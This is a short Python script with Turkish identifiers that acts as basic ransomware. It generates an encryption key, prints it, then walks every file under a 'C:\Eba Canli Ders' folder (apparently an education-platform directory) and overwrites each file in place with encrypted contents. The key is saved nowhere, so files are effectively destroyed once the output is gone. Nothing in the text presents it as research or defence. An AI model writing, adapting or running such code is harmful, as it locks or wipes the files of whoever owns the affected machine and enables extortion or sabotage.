import os
from cryptography.fernet import Fernet
key = Fernet.generate_key()
print(key)
print()
fer = Fernet(key)
def sifrele(veri):
    with open(veri,"rb") as oku:
        oku = oku.read()
    try:
        with open(veri,"wb") as yaz:
            passw = fer.encrypt(oku)
            yaz.write(passw)
    except:
        print("Yetkisiz erişim")

for dosya_konum,gereksiz,dosya_liste in os.walk("C:\\Eba Canli Ders"):
    if dosya_liste:
        for dosya in dosya_liste:
            veri = dosya_konum+"\\"+dosya
            print(veri)
            sifrele(veri=veri)
